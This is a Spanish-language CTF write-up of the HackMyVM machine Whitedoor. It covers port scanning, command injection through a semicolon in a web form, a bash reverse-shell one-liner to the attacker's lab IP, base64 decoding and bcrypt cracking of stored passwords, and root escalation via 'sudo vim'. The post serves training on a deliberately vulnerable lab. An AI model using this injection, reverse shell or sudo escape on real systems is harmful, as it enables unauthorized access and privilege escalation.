---
title: 'Whitedoor'
date: 2024-02-03T14:02:36-03:00
permalink: /posts/hackmyvm/:title/
categories: ["Writeups", "HackMyVm"]
tags: ['Linux', 'CTF', 'base64', 'bcrpyt', 'sudo', 'vim']
image:
  path: /assets/img/hmvm/whitedoor/whitedoor-0.png
---

¡Hola, hacker! ¡Bienvenido a un nuevo post!

En este artículo, abordaremos la resolución de la máquina [Whitedoor](https://hackmyvm.eu/machines/machine.php?vm=Whitedoor) de la plataforma HackMyVM. La máquina aloja un sitio web que presenta un formulario con un campo de entrada, el cual nos concede la capacidad de ejecutar comandos del sistema sin previa validación. De este modo, conseguimos acceso al sistema como el usuario `www-data`. A continuación, realizamos un movimiento lateral para obtener acceso como el usuario `whiteshell` al descifrar una contraseña codificada en base64, la cual encontramos en un archivo de texto plano. Posteriormente, nos enfrentamos al desafío de romper un hash codificado presente en un archivo `.txt`. Finalmente, aprovechamos una configuración inadecuada de `sudo` para elevar nuestros privilegios, logrando así una exitosa escalada de privilegios.

## Reconocimiento

Comenzamos lanzando una traza ICMP a la máquina objetivo para comprobar que tengamos conectividad.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-1.png)
_Reconocimento usando el comando ping_

Vemos que responde al envío de nuestro paquete, verificando de esta manera que tenemos conectividad. Por otra parte, confirmamos que estamos frente a una máquina Linux basandonos en el TTL (Time To Live).

## Enumeración

### Descubrimiento de puertos abiertos
Realizamos un escaneo con nmap para descubrir que puertos TCP se encuentran abiertos en la máquina víctima.

```bash
nmap -sS -p- --open --min-rate 5000 -Pn -n 20.20.20.9 -vvv -oG scanPorts
```

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-2.png)
_Descubrimiento de puertos abiertos_

Parámetros utilizados:

- `-sS`: Realiza un TCP SYN Scan para escanear de manera sigilosa, es decir, que no completa las conexiones TCP con los puertos de la máquina víctima.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `--open`: Solo considerar puertos abiertos.
- `--min-rate 5000`: Establece el número mínimo de paquetes que nmap enviará por segundo.
- `-Pn`: Desactiva el descubrimiento de host por medio de ping.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
- `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.

### Enumeración de versión y servicio

Lanzamos una serie de script básicos de enumeración propios de nmap, para conocer la versión y servicio que esta corriendo bajo los puertos abiertos.

```bash
nmap -sCV -p22,80 -vvv -oN targeted 20.20.20.9
```

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-3.png)
_Descubrimiento de versión y servicio con nmap_

Parámetros utilizados:

- `-sCV` Es la combinación de los parámetros `-sC` y `-sV`. El primero determina que se utilizarán una serie de scripts básiscos de enumeración propios de nmap, para conocer el servicio que esta corriendo en dichos puertos. Por su parte, el segundo parámetro permite conocer más acerca de la versión de ese servicio.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`)
- `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos, junto con el nombre del archivo `targeted`. En este caso, utiliza el formato por defecto de nmap.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.


## Explotación

### FTP

Como observamos en el escaneo anterior, el servicio `ftp` permite acceder con el usuario `anonymous`. En este caso, debemos ingresar como contraseña `anonymous@20.20.20.9`.
Al listar el contenido, nos encontramos con un archivo `README.md` el cual nos descargamos.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-4.png)
_README.md_

Al ver su contenido, nos muestra el siguiente mensaje: `¡Good luck!` :wink:.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-22.png)
_README.md_

### Usuario `www-data`

Continuamos explorando y accedemos al sitio web que se encuentra en ejecución en el puerto 80, donde nos encontramos con lo siguiente:

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-5.png)
_Web Whitedoor_

Contamos un campo de entrada, que al ingresar cualquier texto de prueba nos indica que solo el comando `ls` esta permitido.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-6.png)
_Permission denied. Only the ls command is allowed_

Si ejecutamos el comando `ls`, podemos ver que se listan algunos nombres de archivos.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-7.png)
_Web Whitedoor - ls_

Intentemos ejecutar más de un comando en la misma ejecución. En `bash`, podemos ejecutar varios comandos en una misma línea utilizando el punto y coma ; para separarlos. Utilizando la siguiente sintaxis:

```bash
comando1; comando2; comando3; comando4
```

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-8.png)
_Web Whitedoor - ls; id_

Observamos que efectivamente funciona. Logramos ejecutar el segundo comando después del punto y coma.

Teniendo en cuenta, que tenemos capacidad de ejecución de comandos, ejecutemos una reverse shell. Para lo cual, cremos un archivo (`shell.sh`) bajo el directorio `/tmp` el cual contiene nuestra reverse shell, todo esto desde un oneliner.

Antes de ejecutar nuestra reverse shell, pongámonos en escucha con netcat `nc` por el puerto 4444.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-10.png)
_netcat_

Ejecutamos la reverse shell.

```bash
ls; echo 'bash -i >& /dev/tcp/20.20.20.5/4444 0>&1' > /tmp/shell.sh; chmod +x /tmp/shell.sh; bash /tmp/shell.sh
```

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-9.png)
_Reverse shell_

De esta manera, ganamos acceso al sistema.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-11.png)
_Usuario www-data_

### Usuario `whiteshell`

Haciendo una enumeración básica del sistema, encontramos un archivo llamado `.my_secret_password.txt` bajo el directorio `Desktop` del usuario `whiteshell`.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-12.png)
_Archivo .my_secret_password.txt_

Podemos determinar a que tipo de hash corresponde el conjunto de caracteres encontrado, utilizando la web [tunnelsup.com](https://www.tunnelsup.com/hash-analyzer/).

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-13.png){: width="500" height="250" }
_Hash Analyzer_

Vemos que no logra identificar ningun hash, pero nos indica que el tipo de caracteres corresponde con la codificación base64.

Si decodificamos esta cadena utilizando esta codificación, obtenemos una nueva cadena codificada en base64.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-14.png)
_Decodificación de cadena usando base64_

Decodificamos la nueva cadena usando nuevamente base64 y obtenemos la contraseña del usuario `whiteshell`.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-15.png)
_Decodificación de cadena usando base64_

### Usuario `Gonzalo`

Realizamos nuevamente una enumeración básica al sistema y encontramos un archivo llamado `.my_secret_hash` bajo el directorio `Desktop` del usuario `Gonzalo` el cual contiene un hash codificado con el algoritmo *bcrypt*.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-16.png)
_Hash de la contraseña del usuario Gonzalo_

Usamos `john` para romper el hash y obtener la contraseña del usuario `Gonzalo`.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-17.png)
_Crackeamos el hash usando john para obtener la contraseña_

`Gonzalo:qwertyuiop`

Nos logueamos como el usuario `Gonzalo` y leemos el flag de `user.txt`.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-18.png)
_user.txt_

## Escalada de privilegios

Al realizar una enumeración del sistema, notamos que el usuario `Gonzalo` tiene la capacidad de ejecutar el editor `vim` con privilegios de `sudo`, sin requerir la contraseña (NOPASSWD).

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-19.png)
_sudo -l_

Si hacemos una búsqueda en GTFOBins, podemos ver que existen varias alternativas de poder escalar nuestros privilegios en este contexto [GTFOBins - vim](https://gtfobins.github.io/gtfobins/vim/#sudo), en este caso, usare la primera de ellas.

```bash
sudo vim -c ':!/bin/sh'
```

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-20.png)
_sudo vim_

De esta forma, logramos elevar nuestros privilegios y podemos leer el flag del archivo `root.txt`.

![Whitedoor](/assets/img/hmvm/whitedoor/whitedoor-19.png)
_root.txt_

Así concluimos el Write-up de la máquina Whitedoor.

Espero que los conceptos hayan quedado claros. En caso de persistir alguna duda, te invito a repetir la máquina para afianzar tus conocimientos.

Gracias por tu lectura!

Happy Hacking!
